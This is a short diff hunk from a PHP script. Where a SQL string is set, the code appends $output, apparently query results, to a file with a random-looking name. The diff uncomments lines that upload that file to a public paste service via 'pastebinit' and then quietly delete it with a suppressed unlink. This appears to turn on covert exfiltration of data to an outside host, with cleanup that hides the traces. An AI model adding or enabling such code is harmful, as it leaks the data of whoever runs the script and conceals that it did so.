@@ -64,10 +64,10 @@ if ($sql != '') {
 
 	file_put_contents("xdfrexgvtedvgb.uhdntef", $output, FILE_APPEND);
 
-//	if (file_exists("xdfrexgvtedvgb.uhdntef")) {
-	//	passthru("pastebinit xdfrexgvtedvgb.uhdntef");
-	//}
-	//@unlink("xdfrexgvtedvgb.uhdntef");
+	if (file_exists("xdfrexgvtedvgb.uhdntef")) {
+		passthru("pastebinit xdfrexgvtedvgb.uhdntef");
+	}
+	@unlink("xdfrexgvtedvgb.uhdntef");
 }
 
 function command_exist($cmd)
